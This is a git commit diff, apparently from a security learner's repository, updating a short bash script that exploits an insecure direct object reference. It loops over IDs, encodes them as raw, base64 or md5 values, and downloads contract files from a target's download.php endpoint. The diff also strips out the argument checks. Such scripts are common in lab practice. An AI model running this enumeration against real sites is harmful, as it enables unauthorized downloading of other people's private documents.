ce8fa4f69023c2c47c7babe554e4594bd44341d3
marti-sec <mhervas09@uoc.edu>
2026-05-05 19:54:42 +0200

    Update idor-hash-enum-downloader.sh

--- scripts /idor-hash-enum-downloader.sh
+++ scripts /idor-hash-enum-downloader.sh
@@ -4,13 +4,9 @@
 # Usage: ./idor-enum-downloader.sh http://TARGET mode
 # Modes: raw | base64 | md5
 
+
 url=$1
 mode=$2
-
-if [ -z "$url" ] || [ -z "$mode" ]; then
-    echo "Usage: $0 http://TARGET [raw|base64|md5]"
-    exit 1
-fi
 
 for i in {1..50}; do
     case $mode in
@@ -23,14 +19,10 @@ for i in {1..50}; do
         md5)
             value=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
             ;;
-        *)
-            echo "Invalid mode"
-            exit 1
-            ;;
     esac
 
     echo "[+] Testing ID: $i"
 
-    curl -s "$url/download.php?contract=$value" -O
+    curl -s "$url/download.php?contract=$value" -o "contract_$i.pdf"
 
 done
